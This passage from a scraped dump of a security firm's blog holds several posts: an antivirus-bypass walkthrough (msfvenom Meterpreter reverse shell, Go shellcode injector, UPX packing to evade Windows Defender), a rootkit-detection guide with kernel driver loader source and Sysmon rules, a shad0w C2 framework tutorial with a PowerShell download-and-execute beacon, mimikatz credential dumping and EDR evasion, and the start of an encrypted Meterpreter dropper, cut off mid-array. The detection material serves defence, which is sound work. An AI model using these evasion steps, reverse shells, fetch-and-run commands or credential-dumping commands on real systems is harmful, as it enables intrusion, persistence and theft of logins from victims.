parameters with keyword matching when there are multiple valid execution argument aliases for them. For example, for -NoProfile argument alone, argument substrings such as -NoP, -NoPr -NoPro, -NoProf, -NoProfi and -NoProfil are all valid! This is where we chuck keyword matching filters out of the window and look towards regular expressions for detection.\nFocusing more on the name of the service being installed (yReAMNiNjOyqeWQI) looks like gibberish which is exactly what it is. Looking at the source code of the psexec module for Metasploit framework, we see that the display name is essentially 16 character long random text! We just found another possible filter that could help us detect these types of exploits.\nFurthermore, we can also see a new process created (with event ID 4688) which logs the actual command being executed during this attack!\nDo you remember the thing we did with the group policies earlier? It wasn’t just to fill this blog post with random text and screenshots…nope… instead setting those group policies accordingly will allow you to log what was executed in command prompt as shown above! This is very useful in monitoring what crazy things are being executed on your windows network.\nThat’s all for now, I hope you found this helpful as well as interesting. In the next part of this blog post series I will reveal more ingesting detection techniques."},"title":"Enhanced logging to detect common attacks on Active Directory– Part 1"},"/articles/2019/06/2019-06-20-bypassing-antivirus-with-golang-gopher-it/":{"data":{"":"In this blog post, we’re going to detail a cool little trick we came across on how to bypass most antivirus products to get a Metepreter reverse shell on a target host. This all started when we came across a Github repository written in Golang, which on execution could inject shellcode into running processes. By simply generating a payload with msfvenom we tested it and found that it was easily detected by Windows Defender. The Meterpreter payload was generated as follows:\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxx -b \\x00 -f hex\nThe perk of using Go for this experiment is that it can be cross-compiled, from a Linux host for a target Windows host. The command to compile the application was:\nGOOS=windows GOARCH=amd64 go build\nThis would produce a Go exe which would be executed from the command line, along with the shellcode the attacker wanted to inject. This was easily detected, and Windows Defender identified it as Meterpreter without any trouble. As a quick and easy bypass, we tried to compress the executable using UPX in brute mode, which repeatedly compresses it 8 times. No luck here either, as Windows Defender caught it again.\nFig.1- Attempting to run the Go exe file with the shellcode as an argument. As you can see it was easily detected by Windows Defender. We then tried with the UPX compressed sc.exe file, which also didn’t work.\nFig.2 - Of course, the Meterpreter session is killed as soon as the process is detected by Windows Defender.\nFrom here we inspected the source code of the Go program. After some review, we discovered that the main.go source file could be modified to take the shellcode as a variable then compiled – instead of compiling the .exe then adding the shellcode as a command line argument.\nFig.3 - The go-shellcode/cmd/sc/main.go source.\nFig.4 - The modified go-shellcode/cmd/sc/main.go source, where the reference to a command line argument is substituted for a declared variable.\nWith these we compiled two .exe files, one to be tested without UPX compression, and one with UPX compression. Windows Defender detects the non-compressed version as soon as it touches disk, but does not detect the UPX compressed .exe with static analysis.\nFig.5 - The .exe with no UPX compression is instantly detected as containing a Meterpreter payload by Windows Defender. No dice.\nRunning the custom UPX compressed .exe file is successful however, and a reverse shell is achieved!\nFig.6 - Running the UPX compressed Go exe file is successful, and a reverse shell is achieved on the victim’s machine.\nFantastic. Let’s run it against VT to check how loud the signature for this is.\nFig.7 - Uploading the UPX compressed Go exe file to Virus Total. Only Cybereason and Cylance detect the file as being malicious.\nOnly two antivirus engines are picking up that there is a malicious payload in this file, and both of them don’t specify what exactly about the upload is malicious, just that it IS malicious. The UPX compression is likely what’s triggering the alert, as UPX compression can be used to obfuscate malicious files.\nFig.8 - UPX compression in brute mode compresses the exe file 8 times.\nAnd that’s it! In this blog post we detailed how we modified a great Go program from Github (resource listed below) that performed shellcode injection into one that efficiently evaded most antivirus programs.\nThe gist for this is available here\nReference:\nhttps://github.com/brimstone/go-shellcode\nhttps://boyter.org/posts/trimming-golang-binary-fat/\nhttps://blog.filippo.io/shrink-your-go-binaries-with-this-one-weird-trick/"},"title":"Bypassing Antivirus with Golang - Gopher it!"},"/articles/2020/04/2020-04-20-a-defenders-guide-for-rootkit-detection-episode-1-kernel-drivers/":{"data":{"":"","appendix#Appendix":" Some sysmon rules for detecting KDU and similar tools (the DriverLoad and ImageLoad events may require you to update your exclusion filters) as the vulnerable drivers that get loaded often appear legitimate and are even signed by Microsoft in the case of **PROCEXP152**.sys. \u003cSysmon schemaversion=\"4.23\"\u003e \u003cEventFiltering\u003e \u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e \u003cDriverLoad onmatch=\"include\"\u003e \u003cImageLoaded condition=\"contains\" name=\"MITRE_REF=T1014,NAME=Rootkit\"\u003eTempPROCEXP152.sys\u003c/ImageLoaded\u003e \u003cHashes condition=\"is\" name=\"MITRE_REF=T1014,NAME=Rootkit\"\u003eC06DDA757B92E79540551EFD00B99D4B\u003c/Hashes\u003e \u003c/DriverLoad\u003e \u003c/RuleGroup\u003e \u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e \u003cImageLoad onmatch=\"include\"\u003e \u003cSigned name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"is\"\u003efalse\u003c/Signed\u003e \u003cImageLoaded name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"is\"\u003eC:WindowsSystem32ntoskrnl.exe\u003c/ImageLoaded\u003e \u003c/ImageLoad\u003e \u003c/RuleGroup\u003e \u003cRuleGroup name=\"\" groupRelation=\"and\"\u003e \u003cFileCreate onmatch=\"include\"\u003e \u003cTargetFilename name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eAppDataLocalTempPROCEXP152.sys\u003c/TargetFilename\u003e \u003c/FileCreate\u003e \u003cFileCreate onmatch=\"exclude\"\u003e \u003cImage condition=\"contains\"\u003eprocexp64.exe\u003c/Image\u003e \u003cImage condition=\"contains\"\u003eprocexp.exe\u003c/Image\u003e \u003cImage condition=\"contains\"\u003eprocmon64.exe\u003c/Image\u003e \u003cImage condition=\"contains\"\u003eprocmon.exe\u003c/Image\u003e \u003c/FileCreate\u003e \u003c/RuleGroup\u003e \u003cRuleGroup name=\"\" groupRelation=\"or\"\u003e \u003cRegistryEvent onmatch=\"include\"\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003ePROCEXP152ImagePath\u003c/TargetObject\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eRTCore64ImagePath\u003c/TargetObject\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eGdrvImagePath\u003c/TargetObject\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eATSZIOImagePath\u003c/TargetObject\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eMsIo64ImagePath\u003c/TargetObject\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eMsIoImagePath\u003c/TargetObject\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eGLCKIo2ImagePath\u003c/TargetObject\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eEneIo64ImagePath\u003c/TargetObject\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eEneIoImagePath\u003c/TargetObject\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eWinRing0x64ImagePath\u003c/TargetObject\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eWinRing0_1_2_0ImagePath\u003c/TargetObject\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eEneTechIo64ImagePath\u003c/TargetObject\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eEneTechIoImagePath\u003c/TargetObject\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eNalDrvImagePath\u003c/TargetObject\u003e \u003cTargetObject name=\"MITRE_REF=T1014,NAME=Rootkit\" condition=\"contains\"\u003eHKLM~\u003c/TargetObject\u003e \u003c/RegistryEvent\u003e \u003c/RuleGroup\u003e \u003c/EventFiltering\u003e \u003c/Sysmon\u003e A basic PowerShell script for incident responders to help perform analysis on target machines. The script simply recurses through the entire HKLM registry space and checks for any executable data (by checking the PE header magic bytes and length of the entry). https://gist.github.com/thomjs/e7c5f6087ff646acf32dae89e9c7ecf2","conclusion#Conclusion":"Now, obviously we could have just executed KDU right at the start of this and obtained the IOC’s instantly, but where’s the fun in that? Instead you should now understand one fairly general technique for elevating from system to kernel, the inner workings of kernel level driver loaders (and the many similar tools using this technique), as well as how we can detect them. These detection techniques aren’t particularly sophisticated however, and nothing prevents an adversary from patching or tweaking these variables so KDU writes to different registry hives or disk locations. Or worse yet, making it load the victim and vulnerable drivers from memory instead of dumping them to disk first, in which case we would only see the starting and stopping of the vulnerable and victim driver services. Then simply patching the vulnerable drivers with arbitrary null bytes before loading them would modify the hashes detected by Sysmon. Such is life in cybersecurity… In part 2 we’re going to look at some more sophisticated evasion techniques that rootkits use, and how we can detect those too, so stay tuned!\nThe supporting work in this area is my only credit, people like @hfiref0x, @fuzzysec, and of course our dude @_batsec_ constantly finding ways to break the Windows kernel and invalidate the integrity of our operating systems is one of the many wonders of this world. ","dynamic-analysis#Dynamic Analysis":"Now that we have some potential indicators of execution for KDU from the source code: registry writes, files writes and image loads, we’re going to write some tests to see how this works in practice. To test these providers, I compiled KDU from source, wrote a custom kernel mode driver that acts as a tiny example rootkit, and wrote a batch script to execute kdu -map -prv \u003cID\u003e rootkit.sys repeatedly with each of the providers in sequence. In each case we analyse the changes made to the system, in this example we’ll be using Procmon, and Sysmon.\nThe procmon test shows a pretty clear pattern of events demonstrated by the following diagram:\nSysmon output\nUsing our custom Sysmon config, we also see the following events traced by Sysmon: Create %TEMP%PROVIDER.sys Set HKLMSystemCurrentControlSetServicesPROVIDERStart registry value to 3 (Manual Start) Set HKLMSystemCurrentControlSetServicesPROVIDERImagePath to %TEMP%PROVIDER.sys DRIVER LOADED: PROVIDER.sys Create %CD%PROCEXP152.sys Set HKLMSystemCurrentControlSetServicesPROCEXP152Start registry value to 3 (Manual Start) Set HKLMSystemCurrentControlSetServicesPROCEXP152ImagePath to %CD%PROCEXP152.sys DRIVER LOADED: PROCEXP152.sys Unsigned Image loaded rootkit.sys This makes more sense if we understand that the registry values in HKLMSystemCurrentControlSetServices are set and unset when Windows services are loaded, and these actions aren’t actually performed by the KDU code directly. Instead these events can be read as:\nUnpack vulnerable (provider) driver to %CD% Start it Write rootkit binary data to HKLM~ registry hive Unpack victim driver (**PROCEXP152**.sys) to %TEMP% Start it Unsigned rootkit kernel driver loaded into kernel memory This is almost exactly the pattern evident from the source code, although we had to add an explicit rule to pick up the binary data in HKLM~. What we can note here as well is that this entire process relies on the loading of a very particular version of a vulnerable driver - this means it’ll have a particular hash which we could also use as a signature, as well as the final event - an unsigned driver still gets loaded into memory is the biggest telltale sign of something suspicious happening.","introduction#Introduction":"","references#References":" https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/ https://github.com/hfiref0x/KDU/ https://swapcontext.blogspot.com/2020/01/unwinding-rtcore.html https://eclypsium.com/wp-content/uploads/sites/2/2019/08/EXTERNAL-Get-off-the-kernel-if-you-cant-drive-DEFCON27.pdf https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities https://www.fuzzysecurity.com/tutorials/expDev/23.html ","some-os-basics#Some OS Basics":"","static-analysis#Static Analysis ":"[WARNING: RABBIT HOLE AHEAD]\nIf you’re not interested in KDU source code or boring operating system details then skip to Dynamic Analysis.\nExamining the source code of KDU we see an abstraction layer that is implemented by the driver loader, each provider has the following structure:\n144 typedef struct _KDU_PROVIDER { ………………………………………………… 161 struct { 162 provRegisterDriver RegisterDriver; //optional 163 provUnregisterDriver UnregisterDriver; //optional 164 165 provAllocateKernelVM AllocateKernelVM; //optional 166 provFreeKernelVM FreeKernelVM; //optional 167 168 provReadKernelVM ReadKernelVM; 169 provWriteKernelVM WriteKernelVM; 170 171 provVirtualToPhysical VirtualToPhysical; //optional 172 provReadControlRegister ReadControlRegister; //optional 173 174 provQueryPML4 QueryPML4Value; //optional 175 provReadPhysicalMemory ReadPhysicalMemory; //optional 176 provWritePhysicalMemory WritePhysicalMemory; //optional 177 } Callbacks; 178 } KDU_PROVIDER, * PKDU_PROVIDER; I’ve ignored the unimportant fields, but from here we can understand what it takes to construct a provider, and we can see there are function pointers required for:\nreading and writing virtual memory, mapping virtual addresses to physical addresses, reading and writing physical addresses reading two kernel registers - the PML4 and the Control Register It should be pretty clear so far why we need to be able to read and write physical and virtual memory addresses, but what are the PML4 and the control register and why does the exploit require them? Well if you’re familiar with Linux kernels then the PML4 is simply the base address to the multi-level page table that the kernel uses to map linear virtual address spaces to processes. In order to replace our driver in memory we need to be able to find where it’s stored in memory which requires reading from the page table to find the address space of the target driver. Hence we can read this base address from the PML4 register. The control register should also be familiar to kernel developers or assembly folks, but to those of you who don’t know - it’s a 64-bit register that has a few important use cases required by virtual memory mapping and paging. In cases where either no function is defined for mapping virtual memory to physical memory, and nothing for reading the PML4, KDU uses the control register value to find the page directory address. This allows it to translate virtual addresses to physical addresses so it can walk through the page table and overwrite physical kernel memory regions:\n39 BOOL PwVirtualToPhysical( 40 _In_ HANDLE DeviceHandle, 41 _In_ provQueryPML4 QueryPML4Routine, 42 _In_ provReadPhysicalMemory ReadPhysicalMemoryRoutine, 43 _In_ ULONG_PTR VirtualAddress, 44 _Out_ ULONG_PTR* PhysicalAddress) 45 { 46 ULONG_PTR pml4_cr3, selector, table, entry = 0; 47 INT r, shift; 48 49 *PhysicalAddress = 0; 50 51 if (QueryPML4Routine(DeviceHandle, \u0026pml4_cr3) == 0) 52 return 0; 53 54 table = pml4_cr3 \u0026 PHY_ADDRESS_MASK; 55 56 for (r = 0; r \u003c 4; r++) { 57 58 shift = 39 - (r * 9); 59 selector = (VirtualAddress \u003e\u003e shift) \u0026 0x1ff; 60 61 if (ReadPhysicalMemoryRoutine(DeviceHandle, 62 table + selector * 8, 63 \u0026entry, 64 sizeof(ULONG_PTR)) == 0) 65 { 66 return 0; 67 } 68 69 if (PwEntryToPhyAddr(entry, \u0026table) == 0) 70 return 0; 71 72 if ((r == 2) \u0026\u0026 ((entry \u0026 ENTRY_PAGE_SIZE_BIT) != 0)) { 73 table \u0026= PHY_ADDRESS_MASK_2MB_PAGES; 74 table += VirtualAddress \u0026 VADDR_ADDRESS_MASK_2MB_PAGES; 75 *PhysicalAddress = table; 76 return 1; 77 } 78 } 79 80 table += VirtualAddress \u0026 VADDR_ADDRESS_MASK_4KB_PAGES; 81 *PhysicalAddress = table; Digging deeper into the source code we actually discover that there are two drivers at play here: a victim driver and a vulnerable driver. Initially I presumed these to be the same driver, but the code appears to unpack, load and start the vulnerable driver first - this is the provider - after which it calls KDUMapDriver which tries to load the victim driver.\nIn the case of KDU, the victim driver is always the process explorer PROCEXP152.sys driver, it bootstraps shellcode into the IRP_MJ_DEVICE_CONTROL callback of PROCEXP152, before finally unloading it, triggering the shellcode to execute inside PROCEXP152, allowing the target driver to be loaded into kernel memory.\nFinally, let’s take a look at the core loader functionality, we want to understand the shellcode bootstrapping, and the system calls used to help us figure out what level of detection is possible. This snippet of code is where the bootstrapping happens inside KDUSetupShellCode:\n382 // 383 // Resolve import (ntoskrnl only) and write buffer to registry. 384 // 385 isz = FileHeader-\u003eOptionalHeader.SizeOfImage; 386 387 DataBuffer = supHeapAlloc(isz); 388 if (DataBuffer) { 389 RtlCopyMemory(DataBuffer, Image, isz); 390 391 printf_s(\"[+] Resolving kernel import for input driverrn\"); 392 supResolveKernelImport((ULONG_PTR)DataBuffer, KernelImage, KernelBase); 393 394 lResult = RegOpenKey(HKEY_LOCAL_MACHINE, NULL, \u0026hKey); 395 if ((lResult == ERROR_SUCCESS) \u0026\u0026 (hKey != NULL)) { 396 397 lResult = RegSetKeyValue(hKey, NULL, TEXT(\"~\"), REG_BINARY, 398 DataBuffer, isz); 399 400 bSuccess = (lResult == ERROR_SUCCESS); 401 402 RegCloseKey(hKey); 403 } 404 supHeapFree(DataBuffer); 405 } 406 } We see that first it finds the **ntoskrnl**.exe base address - this is the starting address space of the kernel mapped memory region, containing important structures such as the page directory of mapped memory for all processes on the system. This is important because most process monitoring tools should be able to detect if this image is loaded. After this it calls KDUStorePayload on the driver filename passed to it - interestingly this function writes a byte buffer that is just the raw bytes of the rootkit.sys (or whatever input kernel mode driver you specify) to a registry hive in HKLM with the key “~”:\n[4d5a is hex for MZ also known as the magic bytes in the header of a PE image.]\nA fun part of this registry write is that KDU doesn’t clean up after itself so this artifact remains on the system as an IOC even after KDU’s removal. I’ve thrown together a little powershell script that you can find in the appendix for incident responders to check whether any PE data has been written to registry keys. It will detect KDU in it’s default state as well as any basic attempts at KDU modifications that change the target hive, and any other tools that write executable data to the registry.\nFurthermore, we come across this function call inside VictimBuildName in **victim**.cpp that writes the victim driver .sys in the %TEMP% directory:\n61 LPWSTR VictimBuildName( 62 _In_ LPWSTR VictimName 63 ) 64 { 65 LPWSTR FileName; 66 SIZE_T Length = (1024 + _strlen(VictimName)) * sizeof(WCHAR); 67 68 FileName = (LPWSTR)supHeapAlloc(Length); 69 if (FileName == NULL) { 70 SetLastError(ERROR_NOT_ENOUGH_MEMORY); 71 } 72 else { 73 74 DWORD cch = supExpandEnvironmentStrings(L\"%temp%\\\", FileName, MAX_PATH); 75 if (cch == 0 || cch \u003e MAX_PATH) { 76 SetLastError(ERROR_NOT_ENOUGH_MEMORY); 77 supHeapFree(FileName); 78 FileName = NULL; 79 } 80 else { 81 _strcat(FileName, VictimName); 82 _strcat(FileName, L\".sys\"); 83 } 84 } 85 86 return FileName; 87 } This is exciting, as file writes are also solid ways of detecting malicious activity, especially if the write operations are hardcoded into the executable and not generated on the fly or randomly.","the-story-of-one-kernel-driver-loader#The Story of One Kernel Driver Loader\u0026hellip;":"Author: Thom (@rootkid8), Sysmon Mastery Help from Rana (@sec_coffee)\nIntroduction Even before my birth, rootkits have been one of the most sophisticated and successful ways of obtaining persistence on a machine, and now in 2020 there are ever more trivial ways of escalating from system to kernel. Recently JUMPSEC’s youngest red team researcher @_batsec_ raised the bar once more using rootkit techniques to universally evade Sysmon. This method of defeating Event Tracing for Windows is an incredible feat and the world of Windows logging is left shaken. As a result, we’re going to go down the rabbit hole of kernel driver rootkits, specifically looking at the use of vulnerable kernel drivers to escalate to ring-zero. First we need to start with some basics, how the Windows kernel implements defence-in-depth, how to bypass these restrictions, and how network defenders and system administrators can detect these techniques as “trivially” as attackers can implement them (skip to the end for a Sysmon Config). Some OS Basics For those of us who don’t know, operating systems and common CPU’s define hierarchical protection domains to implement defense in depth. Code executing on the CPU is run in one of these rings using CPU modes - with ring 3 being user-land and ring 0 being kernel-land. Only certain applications that require access to low level devices and hardware should be allowed access to run code in rings 2, 1 and 0, which is enforced at a microcode level on the CPU as well as by the operating system. In theory this privilege domain is sound, and its introduction expelled the days of causing total system crashes with one line of buggy code in user-land. However, the implementation of these rings at the operating system level, and worse-so at the driver level is reasonably vague and undocumented, opening up an entire space for kernel driver exploits as post exploitation privilege escalation and persistence mechanisms. Writing a Kernel Mode Driver We’re going to look more closely at how Windows handles device drivers, since these drivers allow access to kernel space, we will hopefully uncover some of the ways to get arbitrary code to run in kernel mode without the use of a signed driver. Heck, writing a kernel mode driver isn’t a particularly challenging task, but if you want it to run on a target system it will require setting up “Test Mode” on the operating system or completely disabling device driver signing enforcement (DSE) globally which requires access to the boot settings, or through running the following command followed by a reboot:\nbcdedit /set testsigning on Both of these techniques are about as stealthy as using a sledgehammer to hide the noise of your power drill, and not only will most ordinary users recognise the Test Mode warning on their device, many organisations restrict this functionality group wide, and if they don’t then they really should. There is of course a way to hide the watermarks and warnings, but again this is a sledgehammer approach since bcdedit will be caught by a blue team with any real level of sophistication.\nInstead, we need to bypass Driver Signature Enforcement and PatchGuard, both of which being Windows kernel protection mechanisms. One to prevent unsigned drivers being loaded and another to prevent drivers from modifying critical kernel data structures through integrity checks. Again, any blue team should be able to detect the loading of a driver with an expired certificate - SwiftOnSecurity’s handy Sysmon config will anyway!\nThe Story of One Kernel Driver Loader… In order to explore these kernel mode drivers, we need to take a trip back in time. There used to be (and still are) some fantastic base projects for kernel mode drivers like the ones we’re investigating. Written by a legend in this space @hfiref0x - we’ll start with TDL or Turla Driver Loader. Around 4 years ago, this tool was a rootkit developer’s wet dream. It’s the supercedent to DSEFix, another driver loader written by hfiref0x, that became obsolete due to its modification of kernel variables that got blocked by PatchGuard rendering it a guaranteed blue screen generator - a fun prank but not what we’re looking for. TDL acts as a fully functional driver loader that can be used independently of the Windows loader. As a byproduct it defeats 64-bit driver signature enforcement as well. The magic of Turla is the offensive technique it uses to get a custom driver to load into kernel memory. It comes packaged with a vulnerable version of a VirtualBox kernel mode driver, it loads and exploits this driver to overwrite kernel memory with a custom crafted driver before jumping to the DriverEntry function to begin execution. Effectively this can be visualised as so:\nThis technique is somewhat akin to process hollowing, but instead of creating a suspended thread and mapping our code into it, we load a known driver and use shellcode to map our malicious code into that segment of memory.\nThe technique is surprisingly simple, but extremely effective. Since the VirtualBox driver runs in kernel mode already, by dropping shellcode that now runs in kernel land we can execute an mmov, an mmap, and a jump (in reality it’s much more complex than that but just for simplicity’s sake we rely on those three instructions). This means that all the target kernel driver needs is permission to read and write physical memory, and have a code execution CVE for it to become a candidate for kernel driver loading.\nClearly hfiref0x doesn’t sleep, and soon after TDL, Stryker was released, yet another kernel driver loader. This time the loader was crafted to exploit a CPU-Z driver instead, functioning very similarly to its predecessor. Now again in 2020, hfiref0x strikes again with the release of Kernel Driver Utility (KDU) just 2 months ago, the same concept is being used, except now KDU supports multiple vulnerable drivers as “functionality providers’’. Hilariously named, these functionality providers are the keys to the kingdom, and if we have any hopes of detecting rootkits that use this technique we need to understand how KDU loads these drivers, how it exploits them, and what breadcrumbs we can search for on systems to check for compromise.\nLooking briefly at the Github attributes we can see there are 4 CVE’s associated with the project:\ncve-2015-2291 - IQVW32.sys intel ethernet driver vulnerability cve-2019-18845 - MsIo64.sys and MsIo32.sys Patriot Viper vulnerability cve-2018-19320 - GDrv graphics driver vulnerability cve-2019-16098 - RTCore64.sys and RTCore32.sys vulnerability With more providers mentioned in the README:\nATSZIO64 driver from ASUSTeK WinFlash utility of various versions; GLCKIO2 (WinIo) driver from ASRock Polychrome RGB of version 1.0.4; EneIo (WinIo) driver from G.SKILL Trident Z Lighting Control of version 1.00.08; WinRing0x64 driver from EVGA Precision X1 of version 1.0.2.0; EneTechIo (WinIo) driver from Thermaltake TOUGHRAM software of version 1.0.3. The most notable thing regarding these vulnerabilities is that they all expose ring-zero code execution capabilities, enabling the entire kill-chain of KDU. Even more interestingly CVE-2019-16098 even states in the description: These signed drivers can also be used to bypass the Microsoft driver-signing policy to deploy malicious code. As a disclaimer, we can note that hfiref0x states KDU and all similar tools are not actually hacking tools, they are for driver developers to make their lives easier. A lazy AV will flag this tool as malware, but also because in many senses of the word, KDU is malware in the same way a remote access tool for sysadmins can be malware.","writing-a-kernel-mode-driver#Writing a Kernel Mode Driver":""},"title":"A Defender’s Guide For Rootkit Detection: Episode 1 - Kernel Drivers"},"/articles/2020/06/2020-06-03-shad0w/":{"data":{"":"","defenses#Defenses":"In future blog posts I will be going into a lot more detail into how these defenses work in the secure beacon - but here’s a quick overview.\nCurrently shad0w uses 3 main defences:\nDynamic in memory code execution Directly using syscalls Anti DLL injection Dynamic in memory code execution This is achieved by safely hijacking alertable threads in a running processes and injecting the modules directly into them. This can help to avoid Sysmon’s event ID 8, which can be used to detect process injection.\nDirectly using syscalls By directly using native windows syscalls, shad0w is able to avoid any userland API hooks placed by EDR solutions. This will greatly reduce their ability to monitor shad0w.\nAnti DLL injection The main method EDR solutions use to hook and monitor programs is by injecting a DLL into running processes allowing them to watch the inner workings of a program. This is currently combated by two methods: enforcing that only Microsoft signed DLLs are allowed into child processes (not many EDR DLLs are signed by Microsoft) and also by maintaining a whitelist of DLLs that are allowed into processes and blocking all others. This ensures that even if a DLL is signed by Microsoft it will still not be able to enter any of the processes.","enumeration#Enumeration":"Now that we have a active session on the machine we can interact with it via the beacons command.\nshad0w ≫ beacons -i 1 shad0w has some useful commands that can be used to explore and interact with the local file system e.g ls cd pwd rm cat mkdir while also letting you upload and download files.\nOne of the most useful features of shad0w is that it allows you to execute any .NET assembly, EXE, DLL, VBS, JS or XSL file in memory on the target without anything touching disk. For example to execute the .NET assembly seatbelt.exe in memory you can use the execute command, giving the file name with the -f flag and any arguments with the -p flag\nshad0w ≫ execute -f seatbelt.exe -p all All the output from the command will be sent back to your terminal window","getting-a-foothold#Getting a foothold":"shad0w implants are called beacons. There are two types of beacons: secure and insecure. Secure beacons are designed to operate in environments where it is vital to remain undetected whereas insecure beacons are for environments where the security is much more relaxed.\nCurrently there are 3 different formats for beacons: exe, shellcode and powershell. The shellcode and powershell formats allow for shad0w to be used in completely fileless attacks allowing everything to be run entirely inside memory.\nTo generate such a payload you can use the command shown below, this will place the payload of a statically linked secure beacon in beacon.ps1\n$ shad0w beacon -p x64/windows/secure/static -H your.redirector -f psh -o beacon.ps1 The next steps would be to start the C2 server. When starting the C2 it will need to be given the address that the beacon will connect to. So if you are using redirectors it would not be the address of the C2 but rather the address of your first redirector. The command for starting a C2 instance for the beacons to callback to is shown below\n$ shad0w listen -e your.redirector A feature which could also be useful is the C2 servers ability to live proxy and essentially clone a website. This feature can be used with the --mirror or -m flag. This example would mirror the site https://www.bbc.com/ to the address of your redirector https://your.redirector/\n$ shad0w listen -e your.redirector -m \"https://www.bbc.com/\" So then when you visit your redirector you are given https://www.bbc.com/. This will also proxy any links you click or files you download which are on the site you have mirrored.\nNow that your C2 is up and running you can execute the beacon. I will use an example of how you can do so with powershell but due to the beacon being in shellcode form, you can quite easily execute the beacon from many other languages.\nPS\u003e IEX (New-Object System.Net.WebClient).DownloadString(\"https://another.redirector/beacon.ps1\") And we get a callback","modules#Modules":"As I previously said, shad0w is designed to be very modular making the creation of new modules not much of a challenge. To showcase this I’ve added a mimikatz module. It will be executed inside memory like any module you decide to run but it should never be run over a secure beacon. This is because by design mimikatz is not very operationally secure so any half decent EDR should catch it very quickly. It is very much a welcome addition to the insecure beacons though.\nThis module can be used with the mimikatz command.\nshad0w ≫ mimikatz -x sekurlsa::logonpasswords Any other mimikatz commands can also by run by using the -x flag.","overview--install#Overview \u0026amp; Install":"This project can be found on github\nPost exploitation is large part of a red team engagement. While many organisations begin to mature and start to deploy a range of sophisticated Endpoint Detection \u0026 Response solutions (EDR) onto their networks, it requires us, as attackers to also mature. We need to upgrade our arsenal to give us the capabilities to successfully operate on their networks. That is why today, I am releasing shad0w.\nshad0w is a post exploitation framework which is designed to operate covertly on such networks, providing the operator with much greater control over their engagements. Over future blog posts I will go into greater detail on the intricacies of how shad0w works. This blog post will, therefore, serve as an introduction into the usage and features that shad0w has to offer.\nOverview \u0026 Install shad0w is designed to be run inside docker, this is to make life easier for the operator as it has some very specific dependencies which are required for it to work correctly. Installation is very simple, just requiring the two commands shown below.\n$ git clone https://github.com/bats3c/shad0w.git \u0026\u0026 cd shad0w $ sudo ./shad0w install ","privilege-escalation#Privilege Escalation":"I have designed shad0w to be very modular, allowing operators to create and use their own modules. I have kept this philosophy in mind when making the elevate command. I designed it to help elevate the current beacons privileges by using common privilege escalation techniques \u0026 exploits all of which are stored in easy to use modules, allowing an operator to create new or build on existing modules easily.\nTo list the available privesc modules for the current session you can use the --list or -l flag\nshad0w ≫ elevate --list Modules come in two different modes, check and exploit. To run a modules in check mode use the --check or -c flags and to use a module in exploit mode use the --use or -u flags.\nshad0w ≫ elevate --check system_printspoofer shad0w ≫ elevate --use system_printspoofer If an exploit is successful you will receive a new session from a beacon with elevate privileges","stay-up-to-date#Stay Up To Date":"This is a constantly evolving project under active development. There are lots of exciting new features going to be added over the coming weeks so make sure you stay up to date with the lastest changes on this project’s GitHub."},"title":"shad0w"},"/articles/2020/06/2020-06-07-api-hooking-framework/":{"data":{"":"An API hooking framework, composed by a Windows driver component for library injection, a DLL file for function hooking and reporting, and a web service presenting a user interface and managing the communications between the user and the other components.\nThe framework is aimed towards desktop application testing and vulnerability research: allows a granular monitoring of one or more processes at runtime, giving the ability to transparently change the behaviour of the application, and performs various automated vulnerability checks, reporting whenever a potential weakness is found.\nLogs sent by the framework can be filtered and searched for in the web UI, and the library injection can be selectively turned on or off based on different criteria, such as process path, username, or privilege level."},"title":"API Hooking Framework"},"/articles/2020/06/2020-06-07-thunder-eye-threat-intelligence-aggregator/":{"data":{"":"The project currently code-named Thunder Eye is a threat intelligence aggregator that will act as an internal and external search engine for a variety of intelligence purposes. It will collect and store data varying from vulnerability scans, DNS data, breach lists, torrent sites, honeypot networks, and some manually inserted data sourced from our threat hunting and incident response/SOC investigations. It allows our internal team and our clients to benefit from a broad range of data corresponding to their threat landscape the same way an attacker would, enabling us and our clients to defeat cyber attacks as part of usual business processes."},"title":"Thunder Eye – Threat Intelligence Aggregator"},"/articles/2020/08/2020-08-11-defending-your-malware/":{"data":{"":"Malware is an important part of an engagement, though as many security solutions are now evolving past rudimentary signature comparisons to using more advanced techniques to detect malicious activity, it is important that we as attackers understand the methods they are using and how we can avoid them.\nConsider the following code I wrote for example.\n#include \u003cstdio.h\u003e #include \u003cwindows.h\u003e #include \u003cwincrypt.h\u003e #include \u003ctlhelp32.h\u003e /****************************************************************************************************/ // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin // cat meter.bin | openssl enc -rc4 -nosalt -k \"HideMyShellzPlz?\" \u003e encmeter.bin // xxd -i encmeter.bin // x86_64-w64-mingw32-gcc dropper.c -o dropper.exe unsigned char encmeter_bin[] = { 0x6e, 